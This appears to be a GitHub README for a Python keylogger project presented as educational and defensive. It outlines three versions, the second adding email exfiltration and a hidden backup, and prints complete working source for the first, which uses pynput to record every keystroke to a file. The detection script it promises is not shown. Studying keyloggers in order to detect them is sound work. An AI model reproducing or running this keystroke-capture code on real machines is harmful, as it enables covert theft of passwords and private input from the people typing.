# 🕵️‍♂️ Python Keylogger Simulation (Educational Project)

<p align="center">
  <b>Learn Offensive → Build Stronger Defense</b><br>
  <i>Understand how attackers operate &amp; how defenders respond</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Purpose-Educational-blue">
  <img src="https://img.shields.io/badge/Language-Python%203.x-green">
  <img src="https://img.shields.io/badge/Status-Active-orange">
  <img src="https://img.shields.io/badge/License-Ethical%20Use-red">
</p>

---

## 🎯 About This Project

This project simulates how keyloggers work — one of the oldest cyber-attack techniques — and, more importantly, demonstrates how they can be **detected and defended** against.

- 🧠 **Goal:** Understand attacker behavior to build stronger Blue Team defense tools.
- ⚠️ **Disclaimer:** Intended for **educational and research purposes only**.

---

## 📦 Project Versions

| Version | Description |
| ------- | ----------- |
| **v1**  | Basic keylogger — captures keystrokes and saves them to `keylog.txt` |
| **v2**  | Advanced keylogger — captures keystrokes, exfiltrates via email, and stores a hidden backup |
| **v3**  | *Coming soon:* Real-time dynamic detection script &amp; YARA rule for static detection |

---

## 📄 Code Examples & Explanation

### 🔥 Version 1 — Basic Keylogger

```python
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f" [{key}] ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
